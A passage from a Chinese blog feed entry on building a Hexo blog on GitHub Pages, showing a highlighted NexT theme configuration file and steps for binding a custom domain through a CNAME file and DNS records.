class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Site Information Settings</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Put your favicon.ico into `hexo-site/source/` directory.</span></span><br><span class="line"><span class="attr">favicon:</span> <span class="string">/favicon.ico</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set default keywords (Use a comma to separate)</span></span><br><span class="line"><span class="attr">keywords:</span> <span class="string">"ZEROYU, SEC"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set rss to false to disable feed link.</span></span><br><span class="line"><span class="comment"># Leave rss as empty to use site's feed link.</span></span><br><span class="line"><span class="comment"># Set rss to specific value if you have burned your feed already.</span></span><br><span class="line"><span class="attr">rss:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Specify the date when the site was setup</span></span><br><span class="line"><span class="comment">#since: 2015</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># icon between year and author @Footer</span></span><br><span class="line"><span class="attr">authoricon:</span> <span class="string">heart</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Footer `powered-by` and `theme-info` copyright</span></span><br><span class="line"><span class="attr">copyright:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Canonical, set a canonical link tag in your hexo, you could use it for your SEO of blog.</span></span><br><span class="line"><span class="comment"># See: https://support.google.com/webmasters/answer/139066</span></span><br><span class="line"><span class="comment"># Tips: Before you open this tag, remeber set up your URL in hexo _config.yml ( ex. url: http://yourdomain.com )</span></span><br><span class="line"><span class="attr">canonical:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Change headers hierarchy on site-subtitle (will be main site description) and on all post/pages titles for better SEO-optimization.</span></span><br><span class="line"><span class="attr">seo:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Menu Settings</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># When running the site in a subdirectory (e.g. domain.tld/blog), remove the leading slash (/archives -&gt; archives)</span></span><br><span class="line"><span class="attr">menu:</span></span><br><span class="line"><span class="attr">  home:</span> <span class="string">/</span></span><br><span class="line"><span class="attr">  categories:</span> <span class="string">/categories</span></span><br><span class="line"><span class="attr">  about:</span> <span class="string">/about</span></span><br><span class="line"><span class="attr">  archives:</span> <span class="string">/archives</span></span><br><span class="line"><span class="attr">  tags:</span> <span class="string">/tags</span></span><br><span class="line">  <span class="comment">#sitemap: /sitemap.xml</span></span><br><span class="line">  <span class="comment">#commonweal: /404.html</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable/Disable menu icons.</span></span><br><span class="line"><span class="comment"># Icon Mapping:</span></span><br><span class="line"><span class="comment">#   Map a menu item to a specific FontAwesome icon name.</span></span><br><span class="line"><span class="comment">#   Key is the name of menu item and value is the name of FontAwsome icon. Key is case-senstive.</span></span><br><span class="line"><span class="comment">#   When an question mask icon presenting up means that the item has no mapping icon.</span></span><br><span class="line"><span class="attr">menu_icons:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment">#KeyMapsToMenuItemKey: NameOfTheIconFromFontAwesome</span></span><br><span class="line"><span class="attr">  home:</span> <span class="string">home</span></span><br><span class="line"><span class="attr">  about:</span> <span class="string">user</span></span><br><span class="line"><span class="attr">  categories:</span> <span class="string">th</span></span><br><span class="line"><span class="attr">  schedule:</span> <span class="string">calendar</span></span><br><span class="line"><span class="attr">  tags:</span> <span class="string">tags</span></span><br><span class="line"><span class="attr">  archives:</span> <span class="string">archive</span></span><br><span class="line"><span class="attr">  sitemap:</span> <span class="string">sitemap</span></span><br><span class="line"><span class="attr">  commonweal:</span> <span class="string">heartbeat</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Scheme Settings</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Schemes</span></span><br><span class="line"><span class="comment">#scheme: Muse</span></span><br><span class="line"><span class="attr">scheme:</span> <span class="string">Mist</span></span><br><span class="line"><span class="comment">#scheme: Pisces</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Font Settings</span></span><br><span class="line"><span class="comment"># - Find fonts on Google Fonts (https://www.google.com/fonts)</span></span><br><span class="line"><span class="comment"># - All fonts set here will have the following styles:</span></span><br><span class="line"><span class="comment">#     light, light italic, normal, normal intalic, bold, bold italic</span></span><br><span class="line"><span class="comment"># - Be aware that setting too much fonts will cause site running slowly</span></span><br><span class="line"><span class="comment"># - Introduce in 5.0.1</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="attr">font:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Uri of fonts host. E.g. //fonts.googleapis.com (Default)</span></span><br><span class="line"><span class="attr">  host:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Global font settings used on &lt;body&gt; element.</span></span><br><span class="line"><span class="attr">  global:</span></span><br><span class="line">    <span class="comment"># external: true will load this font family from host.</span></span><br><span class="line"><span class="attr">    external:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">    family:</span> <span class="string">Lato</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Font settings for Headlines (h1, h2, h3, h4, h5, h6)</span></span><br><span class="line">  <span class="comment"># Fallback to `global` font settings.</span></span><br><span class="line"><span class="attr">  headings:</span></span><br><span class="line"><span class="attr">    external:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">    family:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Font settings for posts</span></span><br><span class="line">  <span class="comment"># Fallback to `global` font settings.</span></span><br><span class="line"><span class="attr">  posts:</span></span><br><span class="line"><span class="attr">    external:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">    family:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Font settings for Logo</span></span><br><span class="line">  <span class="comment"># Fallback to `global` font settings.</span></span><br><span class="line">  <span class="comment"># The `size` option use `px` as unit</span></span><br><span class="line"><span class="attr">  logo:</span></span><br><span class="line"><span class="attr">    external:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">    family:</span></span><br><span class="line"><span class="attr">    size:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Font settings for &lt;code&gt; and code blocks.</span></span><br><span class="line"><span class="attr">  codes:</span></span><br><span class="line"><span class="attr">    external:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">    family:</span></span><br><span class="line"><span class="attr">    size:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Sidebar Settings</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Social Links</span></span><br><span class="line"><span class="comment"># Key is the link label showing to end users.</span></span><br><span class="line"><span class="comment"># Value is the target link (E.g. GitHub: https://github.com/iissnan)</span></span><br><span class="line"><span class="comment">#social:</span></span><br><span class="line">  <span class="comment">#LinkLabel: Link</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Social Links Icons</span></span><br><span class="line"><span class="comment"># Icon Mapping:</span></span><br><span class="line"><span class="comment">#   Map a menu item to a specific FontAwesome icon name.</span></span><br><span class="line"><span class="comment">#   Key is the name of the item and value is the name of FontAwsome icon. Key is case-senstive.</span></span><br><span class="line"><span class="comment">#   When an globe mask icon presenting up means that the item has no mapping icon.</span></span><br><span class="line"><span class="attr">social_icons:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Icon Mappings.</span></span><br><span class="line">  <span class="comment"># KeyMapsToSocalItemKey: NameOfTheIconFromFontAwesome</span></span><br><span class="line"><span class="attr">  GitHub:</span> <span class="string">github</span></span><br><span class="line"><span class="attr">  Twitter:</span> <span class="string">twitter</span></span><br><span class="line"><span class="attr">  Weibo:</span> <span class="string">weibo</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Sidebar Avatar</span></span><br><span class="line"><span class="comment"># in theme directory(source/images): /images/avatar.jpg</span></span><br><span class="line"><span class="comment"># in site  directory(source/uploads): /uploads/avatar.jpg</span></span><br><span class="line"><span class="comment">#avatar:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Table Of Contents in the Sidebar</span></span><br><span class="line"><span class="attr">toc:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Automatically add list number to toc.</span></span><br><span class="line"><span class="attr">  number:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Creative Commons 4.0 International License.</span></span><br><span class="line"><span class="comment"># http://creativecommons.org/</span></span><br><span class="line"><span class="comment"># Available: by | by-nc | by-nc-nd | by-nc-sa | by-nd | by-sa | zero</span></span><br><span class="line"><span class="comment">#creative_commons: by-nc-sa</span></span><br><span class="line"><span class="comment">#creative_commons:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">sidebar:</span></span><br><span class="line">  <span class="comment"># Sidebar Position, available value: left | right</span></span><br><span class="line"><span class="attr">  position:</span> <span class="string">left</span></span><br><span class="line">  <span class="comment">#position: right</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Sidebar Display, available value:</span></span><br><span class="line">  <span class="comment">#  - post    expand on posts automatically. Default.</span></span><br><span class="line">  <span class="comment">#  - always  expand for all pages automatically</span></span><br><span class="line">  <span class="comment">#  - hide    expand only when click on the sidebar toggle icon.</span></span><br><span class="line">  <span class="comment">#  - remove  Totally remove sidebar including sidebar toggler.</span></span><br><span class="line"><span class="attr">  display:</span> <span class="string">post</span></span><br><span class="line">  <span class="comment">#display: always</span></span><br><span class="line">  <span class="comment">#display: hide</span></span><br><span class="line">  <span class="comment">#display: remove</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Blogrolls</span></span><br><span class="line"><span class="comment">#links_title: Links</span></span><br><span class="line"><span class="comment">#links_layout: block</span></span><br><span class="line"><span class="comment">#links_layout: inline</span></span><br><span class="line"><span class="comment">#links:</span></span><br><span class="line">  <span class="comment">#Title: http://example.com/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Post Settings</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Automatically scroll page to section which is under &lt;!-- more --&gt; mark.</span></span><br><span class="line"><span class="attr">scroll_to_more:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Automatically excerpt description in homepage as preamble text.</span></span><br><span class="line"><span class="attr">excerpt_description:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Automatically Excerpt. Not recommand.</span></span><br><span class="line"><span class="comment"># Please use &lt;!-- more --&gt; in the post to control excerpt accurately.</span></span><br><span class="line"><span class="attr">auto_excerpt:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">  length:</span> <span class="number">150</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Post meta display settings</span></span><br><span class="line"><span class="attr">post_meta:</span></span><br><span class="line"><span class="attr">  item_text:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  created_at:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  updated_at:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">  categories:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Wechat Subscriber</span></span><br><span class="line"><span class="comment">#wechat_subscriber:</span></span><br><span class="line">  <span class="comment">#enabled: true</span></span><br><span class="line">  <span class="comment">#qcode: /path/to/your/wechatqcode ex. /uploads/wechat-qcode.jpg</span></span><br><span class="line">  <span class="comment">#description: ex. subscribe to my blog by scanning my public wechat account</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Misc Theme Settings</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Custom Logo.</span></span><br><span class="line"><span class="comment"># !!Only available for Default Scheme currently.</span></span><br><span class="line"><span class="comment"># Options:</span></span><br><span class="line"><span class="comment">#   enabled: [true/false] - Replace with specific image</span></span><br><span class="line"><span class="comment">#   image: url-of-image   - Images's url</span></span><br><span class="line"><span class="attr">custom_logo:</span></span><br><span class="line"><span class="attr">  enabled:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">  image:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Code Highlight theme</span></span><br><span class="line"><span class="comment"># Available value:</span></span><br><span class="line"><span class="comment">#    normal | night | night eighties | night blue | night bright</span></span><br><span class="line"><span class="comment"># https://github.com/chriskempson/tomorrow-theme</span></span><br><span class="line"><span class="attr">highlight_theme:</span> <span class="string">normal</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Third Party Services Settings</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># MathJax Support</span></span><br><span class="line"><span class="attr">mathjax:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">  per_page:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">  cdn:</span> <span class="string">//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#local search</span></span><br><span class="line"><span class="attr">search:</span></span><br><span class="line"><span class="attr">  path:</span> <span class="string">search.xml</span></span><br><span class="line"><span class="attr">  field:</span> <span class="string">post</span></span><br><span class="line"><span class="attr">  format:</span> <span class="string">html</span></span><br><span class="line"><span class="attr">  limit:</span> <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Swiftype Search API Key</span></span><br><span class="line"><span class="comment">#swiftype_key: oUgCiUNA9jix_1j3uXpn</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Baidu Analytics ID</span></span><br><span class="line"><span class="attr">baidu_analytics:</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># Duoshuo ShortName</span></span><br><span class="line"><span class="attr">duoshuo_shortname:</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># Disqus</span></span><br><span class="line"><span class="comment">#disqus_shortname:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Hypercomments</span></span><br><span class="line"><span class="comment">#hypercomments_id:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Gentie productKey</span></span><br><span class="line"><span class="comment">#gentie_productKey:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Support for youyan comments system.</span></span><br><span class="line"><span class="comment"># You can get your uid from http://www.uyan.cc</span></span><br><span class="line"><span class="comment">#youyan_uid: your uid</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Baidu Share</span></span><br><span class="line"><span class="comment"># Available value:</span></span><br><span class="line"><span class="comment">#    button | slide</span></span><br><span class="line"><span class="comment"># Warning: Baidu Share does not support https.</span></span><br><span class="line"><span class="comment">#baidushare:</span></span><br><span class="line"><span class="comment">##  type: button</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Share</span></span><br><span class="line"><span class="comment">#jiathis:</span></span><br><span class="line"><span class="comment"># Warning: JiaThis does not support https.</span></span><br><span class="line"><span class="comment">#add_this_id:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Share</span></span><br><span class="line"><span class="comment">#duoshuo_share: true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Google Webmaster tools verification setting</span></span><br><span class="line"><span class="comment"># See: https://www.google.com/webmasters/</span></span><br><span class="line"><span class="comment">#google_site_verification:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Google Analytics</span></span><br><span class="line"><span class="comment">#google_analytics:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CNZZ count</span></span><br><span class="line"><span class="comment">#cnzz_siteid:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Application Insights</span></span><br><span class="line"><span class="comment"># See https://azure.microsoft.com/en-us/services/application-insights/</span></span><br><span class="line"><span class="comment"># application_insights:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Make duoshuo show UA</span></span><br><span class="line"><span class="comment"># user_id must NOT be null when admin_enable is true!</span></span><br><span class="line"><span class="comment"># you can visit http://dev.duoshuo.com get duoshuo user id.</span></span><br><span class="line"><span class="attr">duoshuo_info:</span></span><br><span class="line"><span class="attr">  ua_enable:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  admin_enable:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">  user_id:</span> <span class="number">0</span></span><br><span class="line">  <span class="comment">#admin_nickname: Author</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Facebook SDK Support.</span></span><br><span class="line"><span class="comment"># https://github.com/iissnan/hexo-theme-next/pull/410</span></span><br><span class="line"><span class="attr">facebook_sdk:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">  app_id:</span>       <span class="comment">#&lt;app_id&gt;</span></span><br><span class="line"><span class="attr">  fb_admin:</span>     <span class="comment">#&lt;user_id&gt;</span></span><br><span class="line"><span class="attr">  like_button:</span>  <span class="comment">#true</span></span><br><span class="line"><span class="attr">  webmaster:</span>    <span class="comment">#true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Facebook comments plugin</span></span><br><span class="line"><span class="comment"># This plugin depends on Facebook SDK.</span></span><br><span class="line"><span class="comment"># If facebook_sdk.enable is false, Facebook comments plugin is unavailable.</span></span><br><span class="line"><span class="attr">facebook_comments_plugin:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">  num_of_posts:</span> <span class="number">10</span>  <span class="comment"># min posts num is 1</span></span><br><span class="line"><span class="attr">  width:</span> <span class="number">100</span><span class="string">%</span>       <span class="comment"># default width is 550px</span></span><br><span class="line"><span class="attr">  scheme:</span> <span class="string">light</span>     <span class="comment"># default scheme is light (light or dark)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Show number of visitors to each article.</span></span><br><span class="line"><span class="comment"># You can visit https://leancloud.cn get AppID and AppKey.</span></span><br><span class="line"><span class="attr">leancloud_visitors:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  app_id:</span>  <span class="comment">#&lt;app_id&gt;</span></span><br><span class="line"><span class="attr">  app_key:</span> <span class="comment">#&lt;app_key&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Show PV/UV of the website/page with busuanzi.</span></span><br><span class="line"><span class="comment"># Get more information on http://ibruce.info/2015/04/04/busuanzi/</span></span><br><span class="line"><span class="attr">busuanzi_count:</span></span><br><span class="line">  <span class="comment"># count values only if the other configs are false</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># custom uv span for the whole site</span></span><br><span class="line"><span class="attr">  site_uv:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  site_uv_header:</span> <span class="string">&lt;i</span> <span class="string">class="fa</span> <span class="string">fa-user"&gt;&lt;/i&gt;</span></span><br><span class="line"><span class="attr">  site_uv_footer:</span></span><br><span class="line">  <span class="comment"># custom pv span for the whole site</span></span><br><span class="line"><span class="attr">  site_pv:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  site_pv_header:</span> <span class="string">&lt;i</span> <span class="string">class="fa</span> <span class="string">fa-eye"&gt;&lt;/i&gt;</span></span><br><span class="line"><span class="attr">  site_pv_footer:</span></span><br><span class="line">  <span class="comment"># custom pv span for one page only</span></span><br><span class="line"><span class="attr">  page_pv:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  page_pv_header:</span> <span class="string">&lt;i</span> <span class="string">class="fa</span> <span class="string">fa-file-o"&gt;&lt;/i&gt;</span></span><br><span class="line"><span class="attr">  page_pv_footer:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Tencent analytics ID</span></span><br><span class="line"><span class="comment"># tencent_analytics:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable baidu push so that the blog will push the url to baidu automatically which is very helpful for SEO</span></span><br><span class="line"><span class="attr">baidu_push:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Google Calendar</span></span><br><span class="line"><span class="comment"># Share your recent schedule to others via calendar page</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># API Documentation:</span></span><br><span class="line"><span class="comment"># https://developers.google.com/google-apps/calendar/v3/reference/events/list</span></span><br><span class="line"><span class="attr">calendar:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">  calendar_id:</span> <span class="string">&lt;required&gt;</span></span><br><span class="line"><span class="attr">  api_key:</span> <span class="string">&lt;required&gt;</span></span><br><span class="line"><span class="attr">  orderBy:</span> <span class="string">startTime</span></span><br><span class="line"><span class="attr">  offsetMax:</span> <span class="number">24</span></span><br><span class="line"><span class="attr">  offsetMin:</span> <span class="number">4</span></span><br><span class="line"><span class="attr">  timeZone:</span></span><br><span class="line"><span class="attr">  showDeleted:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">  singleEvents:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  maxResults:</span> <span class="number">250</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Algolia Search</span></span><br><span class="line"><span class="attr">algolia_search:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">  hits:</span></span><br><span class="line"><span class="attr">    per_page:</span> <span class="number">10</span></span><br><span class="line"><span class="attr">  labels:</span></span><br><span class="line"><span class="attr">    input_placeholder:</span> <span class="string">Search</span> <span class="string">for</span> <span class="string">Posts</span></span><br><span class="line"><span class="attr">    hits_empty:</span> <span class="string">"We didn't find any results for the search: $&#123;query&#125;"</span></span><br><span class="line"><span class="attr">    hits_stats:</span> <span class="string">"$&#123;hits&#125; results found in $&#123;time&#125; ms"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#! ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#! DO NOT EDIT THE FOLLOWING SETTINGS</span></span><br><span class="line"><span class="comment">#! UNLESS YOU KNOW WHAT YOU ARE DOING</span></span><br><span class="line"><span class="comment">#! ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Motion</span></span><br><span class="line"><span class="attr">use_motion:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Fancybox</span></span><br><span class="line"><span class="attr">fancybox:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Canvas-nest</span></span><br><span class="line"><span class="attr">canvas_nest:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Script Vendors.</span></span><br><span class="line"><span class="comment"># Set a CDN address for the vendor you want to customize.</span></span><br><span class="line"><span class="comment"># For example</span></span><br><span class="line"><span class="comment">#    jquery: https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js</span></span><br><span class="line"><span class="comment"># Be aware that you should use the same version as internal ones to avoid potential problems.</span></span><br><span class="line"><span class="comment"># Please use the https protocol of CDN files when you enable https on your site.</span></span><br><span class="line"><span class="attr">vendors:</span></span><br><span class="line">  <span class="comment"># Internal path prefix. Please do not edit it.</span></span><br><span class="line"><span class="attr">  _internal:</span> <span class="string">lib</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Internal version: 2.1.3</span></span><br><span class="line"><span class="attr">  jquery:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Internal version: 2.1.5</span></span><br><span class="line">  <span class="comment"># See: http://fancyapps.com/fancybox/</span></span><br><span class="line"><span class="attr">  fancybox:</span></span><br><span class="line"><span class="attr">  fancybox_css:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Internal version: 1.0.6</span></span><br><span class="line">  <span class="comment"># See: https://github.com/ftlabs/fastclick</span></span><br><span class="line"><span class="attr">  fastclick:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Internal version: 1.9.7</span></span><br><span class="line">  <span class="comment"># See: https://github.com/tuupola/jquery_lazyload</span></span><br><span class="line"><span class="attr">  lazyload:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Internal version: 1.2.1</span></span><br><span class="line">  <span class="comment"># See: http://VelocityJS.org</span></span><br><span class="line"><span class="attr">  velocity:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Internal version: 1.2.1</span></span><br><span class="line">  <span class="comment"># See: http://VelocityJS.org</span></span><br><span class="line"><span class="attr">  velocity_ui:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Internal version: 0.7.9</span></span><br><span class="line">  <span class="comment"># See: https://faisalman.github.io/ua-parser-js/</span></span><br><span class="line"><span class="attr">  ua_parser:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Internal version: 4.6.2</span></span><br><span class="line">  <span class="comment"># See: http://fontawesome.io/</span></span><br><span class="line"><span class="attr">  fontawesome:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Internal version: 1</span></span><br><span class="line">  <span class="comment"># https://www.algolia.com</span></span><br><span class="line"><span class="attr">  algolia_instant_js:</span></span><br><span class="line"><span class="attr">  algolia_instant_css:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Internal version: 1.0.0</span></span><br><span class="line">  <span class="comment"># https://github.com/hustcc/canvas-nest.js</span></span><br><span class="line"><span class="attr">  canvas_nest:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Assets</span></span><br><span class="line"><span class="attr">css:</span> <span class="string">css</span></span><br><span class="line"><span class="attr">js:</span> <span class="string">js</span></span><br><span class="line"><span class="attr">images:</span> <span class="string">images</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Theme version</span></span><br><span class="line"><span class="attr">version:</span> <span class="number">5.1</span><span class="number">.0</span></span><br></pre></td></tr></table></figure><h4 id="个性化设置"><a href="#个性化设置" class="headerlink" title="个性化设置"></a>个性化设置</h4><p>按照<a href="http://theme-next.iissnan.com/" target="_blank" rel="noopener">NexT 使用文档</a>设置一下，其中的内容下面不再赘述。</p><h4 id="绑定个人域名"><a href="#绑定个人域名" class="headerlink" title="绑定个人域名"></a>绑定个人域名</h4><p>1、在source文件夹中新建一个CNAME文件（无后缀名），然后用文本编辑器打开，在首行添加你的网站域名，如<a href="https://link.zhihu.com/?target=http%3A//xxxx.com" target="_blank" rel="noopener">http://xxxx.com</a>，注意前面没有http://，也没有www，然后使用hexo g &amp;&amp; hexo d上传部署。<br>2、在域名解析提供商，下面以dnspod为例。<br>（1）先添加一个CNAME，主机记录写@，后面记录值写上你的<a href="https://link.zhihu.com/?target=http%3A//xxxx.github.io" target="_blank" rel="noopener">http://xxxx.github.io</a><br>（2）再添加一个CNAME，主机记录写www，后面记录值也是<a href="https://link.zhihu.com/?target=http%3A//xxxx.github.io" target="_blank" rel="noopener">http://xxxx.github.io</a><br>这样别人用www和不用www都能访问你的网站（其实www的方式，会先解析成<a href="https://link.zhihu.com/?target=http%3A//xxxx.github.io" target="_blank" rel="noopener">http://xxxx.github.io</a>，然后根据CNAME再变成<a href="https://link.zhihu.com/?target=http%3A//xxx.com" target="_blank" rel="noopener">http://xxx.com</a>，即中间是经过一次转换的）。上面，我们用的是CNAME别名记录，也有人使用A记录，后面的记录值是写github page里面的ip地址，但有时候IP地址会更改，导致最后解析不正确，所以还是推荐用CNAME别名记录要好些，不建议用IP。<br>3、等十分钟左右，刷新浏览器，用你自己域名访问下试试(<a href="https://www.zhihu.com/question/31377141/answer/87541858" target="_blank" rel="noopener">参考</a>)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;GitHub Pages 本用于介绍托管在 GitHub 的项目，也可以用来搭建博客，有300M免费空间。&lt;/p&gt;
&lt;p&gt;hexo是一个基于Node.js的静态博客程序，可以方便的生成静态网页托管在github和Heroku上。作者是来自台湾的&lt;a href=&quot;https:
      
    
    </summary>
    
    
  </entry>
  
